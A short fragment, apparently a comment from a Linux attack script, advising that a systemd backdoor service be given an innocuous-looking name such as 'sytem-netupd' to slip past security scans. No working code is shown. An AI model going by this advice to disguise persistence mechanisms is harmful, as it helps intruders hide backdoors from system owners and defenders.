...
# Define the systemd backdoor service name (consider that names like "sytem-netupd" may trick most unaware security scans by being something required for the proper/updated functionality of system operations, such as in this case "system network updates".
